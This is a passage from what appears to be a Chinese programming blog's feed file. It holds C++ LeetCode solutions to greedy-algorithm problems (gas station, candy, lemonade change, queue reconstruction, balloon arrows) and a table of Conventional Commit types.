class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(a) &gt; <span class="hljs-built_in">abs</span>(b);<br>    &#125;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">largestSumAfterKNegations</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; A, <span class="hljs-type">int</span> K)</span> </span>&#123;<br>            <span class="hljs-built_in">sort</span>(A.<span class="hljs-built_in">begin</span>(), A.<span class="hljs-built_in">end</span>(), cmp);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>                <span class="hljs-keyword">if</span> (A[i] &lt; <span class="hljs-number">0</span> &amp;&amp; K &gt; <span class="hljs-number">0</span>) &#123;<br>                    A[i] *= <span class="hljs-number">-1</span>;<br>                    K --;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (K % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)<br>                A[A.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>] *= <span class="hljs-number">-1</span>;<br>            <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> a : A)<br>                result += a;<br>            <br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="加油站">加油站</h2><p><a href="https://leetcode.cn/problems/gas-station/">134. 加油站 -力扣（Leetcode）</a></p><h3 id="暴力方法">暴力方法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">canCompleteCircuit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; gas, vector&lt;<span class="hljs-type">int</span>&gt;&amp; cost)</span> </span>&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cost.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>                <span class="hljs-type">int</span> rest = gas[i] - cost[i];<br>                <span class="hljs-type">int</span> index = (i + <span class="hljs-number">1</span>) % cost.<span class="hljs-built_in">size</span>();<br>                <span class="hljs-keyword">while</span> (rest &gt; <span class="hljs-number">0</span> &amp;&amp; index != i) &#123;  <span class="hljs-comment">// 模拟以i为起点行驶一圈 </span><br>                    rest += gas[index] - cost[index];<br>                    index = (index + <span class="hljs-number">1</span>) % cost.<span class="hljs-built_in">size</span>();<br>                &#125;<br>                <span class="hljs-comment">// 如果以i为起点跑一圈，剩余流量&gt;=0，返回该起始位置</span><br>                <span class="hljs-keyword">if</span> (rest &gt;= <span class="hljs-number">0</span> &amp;&amp; index == i)<br>                    <span class="hljs-keyword">return</span> i;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="贪心算法方法一">贪心算法（方法一）</h3><ul><li>情况一：如果gas的综合小于cost总和，那么无论从哪里出发，一定是跑不了一圈的</li><li>情况二：rest[i] =gas[i]-cost[i]为一天剩下的油，i从0开始计算累加到最后一站，如果累加没有出现负数，说明从0出发，油就没有断过，那么0就是起点</li><li>情况三：如果累加的最小值是负数，汽车就要从非0节点出发，从后向前，看哪个节点能将这个负数填平，能把这个负数填平的节点就是出发节点</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">canCompleteCircuit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; gas, vector&lt;<span class="hljs-type">int</span>&gt;&amp; cost)</span> </span>&#123;<br>            <span class="hljs-type">int</span> curSum = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> min = INT_MAX;  <span class="hljs-comment">// 从起点出发，油箱里的油量最小值</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; gas.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>                <span class="hljs-type">int</span> rest = gas[i] - cost[i];<br>                curSum += rest;<br>                <span class="hljs-keyword">if</span> (curSum &lt; min) &#123;<br>                    min = curSum;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (curSum &lt; <span class="hljs-number">0</span>)  <span class="hljs-comment">// 情况1</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">if</span> (min &gt;= <span class="hljs-number">0</span>)  <span class="hljs-comment">// 情况2</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = gas.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i --) &#123;  <span class="hljs-comment">// 情况3</span><br>                <span class="hljs-type">int</span> rest = gas[i] - cost[i];<br>                min += rest;<br>                <span class="hljs-keyword">if</span> (min &gt;= <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">return</span> i;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            <br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="贪心算法方法二">贪心算法（方法二）</h3><p><strong>局部最优：当前累加rest[j]和curSum一旦小于0，起始位置至少要是j+1，因为从j开始一定不行。全局最优：找到可以跑一圈的起始位置。</strong></p><img src="/2023/01/25/Algorithm/algorithm-9/20201213162821958.png" class="" title="134.加油站"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">canCompleteCircuit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; gas, vector&lt;<span class="hljs-type">int</span>&gt;&amp; cost)</span> </span>&#123;<br>        <span class="hljs-type">int</span> curSum = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> totalSum = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> start = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; gas.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            curSum += gas[i] - cost[i];<br>            totalSum += gas[i] - cost[i];<br>            <span class="hljs-keyword">if</span> (curSum &lt; <span class="hljs-number">0</span>) &#123;   <span class="hljs-comment">// 当前累加rest[i]和 curSum一旦小于0</span><br>                start = i + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 起始位置更新为i+1</span><br>                curSum = <span class="hljs-number">0</span>;     <span class="hljs-comment">// curSum从0开始</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (totalSum &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 说明怎么走都不可能跑一圈了</span><br>        <span class="hljs-keyword">return</span> start;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="分发糖果">分发糖果</h2><p><a href="https://leetcode.cn/problems/candy/">135. 分发糖果 -力扣（LeetCode）</a></p><p>这道题目一定是要确实一边之后，再确定另一边，例如比较每一个孩子的左边，然后再比较右边，<strong>如果两边一起考虑一定会顾此失彼。</strong></p><p>先确定右边评分大于左边的情况（从前向后遍历）</p><p>局部最优：只要右边评分比左边大，右边的孩子就多一个糖果</p><p>全局最优：相邻的孩子中，评分高的右孩子获得比左边孩子更多的糖果。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; ratings.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>    <span class="hljs-keyword">if</span> (ratings[i] &gt; ratings[i - <span class="hljs-number">1</span>])<br>        candyVec[i] = candyVec[i - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/01/25/Algorithm/algorithm-9/20201117114916878.png" class="" title="135.分发糖果"><p>再确定左孩子大于右孩子的情况（从后向前遍历）</p><img src="/2023/01/25/Algorithm/algorithm-9/20230202102044.png" class="" title="img"><p><strong>所以确定左孩子大于右孩子的情况一定要从后向前遍历！</strong></p><img src="/2023/01/25/Algorithm/algorithm-9/20201117115658791.png" class="" title="135.分发糖果1"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">candy</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; ratings)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">candyVec</span><span class="hljs-params">(ratings.size(), <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-comment">// 从前向后</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; ratings.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            <span class="hljs-keyword">if</span> (ratings[i] &gt; ratings[i - <span class="hljs-number">1</span>])<br>                candyVec[i] = candyVec[i - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>        &#125;<br>        <br>        <span class="hljs-comment">// 从后向前</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = ratings.<span class="hljs-built_in">size</span>() - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i --) &#123;<br>            <span class="hljs-keyword">if</span> (ratings[i] &gt; ratings[i + <span class="hljs-number">1</span>]) &#123;<br>                candyVec[i] = <span class="hljs-built_in">max</span>(candyVec[i], candyVec[i + <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//统计结果</span><br>        <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; candyVec.<span class="hljs-built_in">size</span>(); i ++)<br>            result += candyVec[i];<br>        <br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="柠檬水找零">柠檬水找零</h2><p><a href="https://leetcode.cn/problems/lemonade-change/">860.柠檬水找零 - 力扣（Leetcode）</a></p><p><strong>美元10只能给账单找零，而美元5可以给账单10和账单20找零，美元5是万能的</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">lemonadeChange</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; bills)</span> </span>&#123;<br>            <span class="hljs-type">int</span> five = <span class="hljs-number">0</span>, ten = <span class="hljs-number">0</span>, twenty = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> bill : bills) &#123;<br>                <span class="hljs-keyword">if</span> (bill == <span class="hljs-number">5</span>)<br>                    five ++;<br>                <span class="hljs-keyword">if</span> (bill == <span class="hljs-number">10</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (five &lt;= <span class="hljs-number">0</span>)<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    ten ++;<br>                    five --;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (bill == <span class="hljs-number">20</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (five &gt; <span class="hljs-number">0</span> &amp;&amp; ten &gt; <span class="hljs-number">0</span>) &#123;<br>                        five --;<br>                        ten --;<br>                        twenty ++;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (five &gt;= <span class="hljs-number">3</span>) &#123;<br>                        five -= <span class="hljs-number">3</span>;<br>                        twenty ++;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="根据身高重建队列">根据身高重建队列</h2><p><ahref="https://leetcode.cn/problems/queue-reconstruction-by-height/">406.根据身高重建队列 - 力扣（Leetcode）</a></p><p><strong>遇到两个维度权衡的时候，一定要先确定一个维度，再确定另一个维度，如果两个维度一起考虑一定会顾此失彼</strong></p><p>按照身高来排序，身高一定是从大到小排。</p><p><strong>局部最优：优先按身高高的people的k来插入。插入操作过后的people满足队列属性，</strong></p><p><strong>全局最优：最后都做完插入操作，整个队列满足题目队列属性。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; b)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> ( a[<span class="hljs-number">0</span>] == b[<span class="hljs-number">0</span>])<br>            <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] &gt; b[<span class="hljs-number">0</span>];<br>    &#125;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">reconstructQueue</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; people) &#123;<br>        <span class="hljs-built_in">sort</span>(people.<span class="hljs-built_in">begin</span>(), people.<span class="hljs-built_in">end</span>(), cmp);<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; que;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; people.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            <span class="hljs-type">int</span> position = people[i][<span class="hljs-number">1</span>];<br>            que.<span class="hljs-built_in">insert</span>(que.<span class="hljs-built_in">begin</span>() + position, people[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> que;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; b)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (a[<span class="hljs-number">0</span>] == b[<span class="hljs-number">0</span>])<br>            <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] &gt; b[<span class="hljs-number">0</span>];<br>        <br>    &#125; <br>    <br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">reconstructQueue</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; people) &#123;<br>        <span class="hljs-built_in">sort</span>(people.<span class="hljs-built_in">begin</span>(), people.<span class="hljs-built_in">end</span>(), cmp);<br>        list&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; que;  <span class="hljs-comment">// list底层是链表实现，插入效率比vector高</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; people.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            <span class="hljs-type">int</span> position = people[i][<span class="hljs-number">1</span>];<br>            std::list&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;::iterator it = que.<span class="hljs-built_in">begin</span>();<br>            <span class="hljs-keyword">while</span> (position --) &#123;  <span class="hljs-comment">// 寻找再插入位置</span><br>                it ++;<br>            &#125;<br>            que.<span class="hljs-built_in">insert</span>(it, people[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;(que.<span class="hljs-built_in">begin</span>(), que.<span class="hljs-built_in">end</span>());<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="用最少数量的箭引爆气球">用最少数量的箭引爆气球</h2><p><ahref="https://leetcode.cn/problems/minimum-number-of-arrows-to-burst-balloons/">452.用最少数量的箭引爆气球 - 力扣（LeetCode）</a></p><p><strong>局部最优：当气球出现重叠，一起射，所用弓箭最少；</strong></p><p><strong>全局最优：把所有气球射爆用的弓箭最少。</strong></p><p>为了让气球尽可能的重叠，需要对数组进行排序，如果气球重叠了，重叠气球中右边边界的最小值之前的区间一定需要一个弓箭。</p><img src="/2023/01/25/Algorithm/algorithm-9/20201123101929791.png" class="" title="452.用最少数量的箭引爆气球"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>&#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">cmp</span> <span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] &lt; b[<span class="hljs-number">0</span>];<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMinArrowShots</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; points)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (points.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">sort</span>(points.<span class="hljs-built_in">begin</span>(), points.<span class="hljs-built_in">end</span>(), cmp);<br>        <br>        <span class="hljs-type">int</span> result = <span class="hljs-number">1</span>;  <span class="hljs-comment">// need 1 arrow at least when ponints is empty</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; points.<span class="hljs-built_in">size</span>();  i ++) &#123;<br>            <span class="hljs-keyword">if</span> (points[i][<span class="hljs-number">0</span>] &gt; points[i<span class="hljs-number">-1</span>][<span class="hljs-number">1</span>]) &#123;<br>                result ++;<br>            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// The two balloons are not close to each other</span><br>                points[i][<span class="hljs-number">1</span>] = <span class="hljs-built_in">min</span>(points[i<span class="hljs-number">-1</span>][<span class="hljs-number">1</span>], points[i][<span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>贪心算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Conventional Commit Types</title>
    <link href="/2023/01/22/Tools/Conventional-Commit-Types/"/>
    <url>/2023/01/22/Tools/Conventional-Commit-Types/</url>
    
    <content type="html"><![CDATA[<h1 id="conventional-commit-types">Conventional Commit Types</h1><h2 id="commit-types">Commit types</h2><table style="width:100%;"><thead><tr class="header"><th style="text-align: center;">Commit Type</th><th>Title</th><th>Description</th><th style="text-align: center;">Emoji</th><th>Release</th><th style="text-align: center;">Include in changelog</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><code>feat</code></td><td>Features</td><td>A new feature</td><td style="text-align: center;">✨</td><td><code>minor</code></td><td style="text-align: center;"><code>true</code></td></tr><tr class="even"><td style="text-align: center;"><code>fix</code></td><td>Bug Fixes</td><td>A bug Fix</td><td style="text-align: center;">🐛</td><td><code>patch</code></td><td style="text-align: center;"><code>true</code></td></tr><tr class="odd"><td style="text-align: center;"><code>docs</code></td><td>Documentation</td><td>Documentation only changes</td><td style="text-align: center;">📚</td><td><code>patch</code> if <code>scope</code> is <code>readme</code></td><td style="text-align: center;"><code>true</code></td></tr><tr class="even"><td style="text-align: center;"><code>style</code></td><td>Styles</td><td>Changes that do not affect the meaning of the code (white-space,formatting, missing semi-colons, etc)</td><td style="text-align: center;">💎</td><td>-</td><td style="text-align: center;"><code>true</code></td></tr><tr class="odd"><td style="text-align: center;"><code>refactor</code></td><td>Code Refactoring</td><td>A code change that neither fixes a bug nor adds a feature</td><td style="text-align: center;">📦</td><td>-</td><td style="text-align: center;"><code>true</code></td></tr><tr class="even"><td style="text-align: center;"><code>perf</code></td><td>Performance Improvements</td><td>A code change that improves performance</td><td style="text-align: center;">🚀</td><td><code>patch</code></td><td style="text-align: center;"><code>true</code></td></tr><tr class="odd"><td style="text-align: center;"><code>test</code></td><td>Tests</td><td>Adding missing tests or correcting existing tests</td><td style="text-align: center;">🚨</td><td>-</td><td style="text-align: center;"><code>true</code></td></tr><tr class="even"><td style="text-align: center;"><code>build</code></td><td>Builds</td><td>Changes that affect the build system or external dependencies(example scopes: gulp, broccoli, npm)</td><td style="text-align: center;">🛠</td><td><code>patch</code></td><td style="text-align: center;"><code>true</code></td></tr><tr class="odd"><td style="text-align: center;"><code>ci</code></td><td>Continuous Integrations</td><td>Changes to our CI configuration files and scripts (example scopes:Travis, Circle, BrowserStack, SauceLabs)</td><td style="text-align: center;">⚙️</td><td>-</td><td style="text-align: center;"><code>true</code></td></tr><tr class="even"><td style="text-align: center;"><code>chore</code></td><td>Chores</td><td>Other changes that don't modify src or test files</td><td style="text-align: center;">♻️</td><td>-</td><td style="text-align: center;"><code>true</code></td></tr><tr class="odd"><td style="text-align: center;"><code>revert</code></td><td>Reverts</td><td>Reverts a previous commit</td><td style="text-align: center;">🗑</td><td>-</td><td style="text-align: center;"><code>true</code></td></tr></tbody></table><p><strong>另：</strong><ahref="https://www.conventionalcommits.org/zh-hans/v1.0.0/">约定式提交(conventionalcommits.org)</a></p>]]></content>
    
    
    <categories>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二叉树（三）</title>
    <link href="/2022/10/25/Algorithm/algorithm-8/"/>
    <url>/2022/10/25/Algorithm/algorithm-8/</url>
    
